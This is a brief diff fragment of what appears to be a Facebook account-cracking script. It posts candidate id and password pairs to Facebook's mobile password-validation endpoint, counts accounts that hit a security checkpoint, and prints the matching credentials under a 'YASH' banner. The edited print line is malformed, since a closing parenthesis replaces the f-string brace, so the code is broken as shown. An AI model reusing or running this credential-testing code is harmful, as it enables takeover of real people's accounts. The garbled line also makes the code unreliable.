@@ -342,7 +342,7 @@ ses.headers.update({
 po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data = dataa,allow_redirects = False)
 if "checkpoint" in po.cookies.get_dict().keys():
 cp += 1
-print(f'\r\x1b[1;91m [ YASH🔥-CP ] {
+print(f'\r\x1b[1;91m [ YASH🔥-CP ] )
     idf
 } | {
     pw
